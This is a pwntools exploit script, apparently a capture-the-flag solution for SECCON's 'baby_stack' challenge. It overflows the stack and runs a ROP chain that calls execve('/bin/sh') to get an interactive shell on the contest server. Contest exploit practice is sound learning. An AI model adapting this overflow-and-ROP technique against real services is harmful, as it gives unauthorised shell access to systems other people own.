from pwn import *

def getConn():
    return remote('172.16.12.143', 1234) if local else remote('baby_stack.pwn.seccon.jp', 15285)

local = True

e = ELF('baby_stack')

#print hex(e.bss())

BSS = 0x59F920

#pattc = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"

padding = 'A' * 104
ropchain = ''

#padding += p64(0xc82003fd58) + p64(0x00)

#padding += 'A' * 80

#padding += p64(0xc82003fd58) + p64(0x00)

#padding += 'A'*192

#padding += pattc

r = getConn()
r.recvuntil('Please tell me your name >> ')
r.sendline('A')
r.recvuntil('Give me your message >> ')

# setting /bin/sh into bss address
ropchain += p64(0x4016ea) # pop rax ; ret
ropchain += p64(BSS) # @.data
ropchain += p64(0x0000000000470931) # pop rdi ; or byte ptr [rax + 0x39], cl ; ret
ropchain += p64(BSS) # @.data
ropchain += p64(0x4016ea) # pop rax ; ret
ropchain += '/bin/sh\x00'
ropchain += p64(0x0000000000456499) # mov qword ptr [rdi], rax ; ret

# clear rsi and rdx registers
ropchain += p64(0x4016ea) # pop rax ; ret
ropchain += p64(BSS) # @.data
ropchain += p64(0x00000000004a247c) # pop rdx ; or byte ptr [rax - 0x77], cl ; ret
ropchain += p64(0x0)
ropchain += p64(0x000000000046defd) # pop rsi ; ret
ropchain += p64(0x0)

# setting rax into execve 0x3b syscall number
ropchain += p64(0x00000000004016ea) # pop rax ; ret
ropchain += p64(0x3b)

# call system call
ropchain += p64(0x0000000000456889) # syscall ; ret
r.sendline(padding + p64(0xc82003fd58) + p64(0x00) + 'A'*80 + p64(0xc82003fd58) + p64(0x00) + 'A'*192 + ropchain)
#print(padding + p64(0xc82003fd58) + p64(0x00) + 'A'*80 + p64(0xc82003fd58) + p64(0x00) + 'A'*192 + ropchain)
r.interactive()
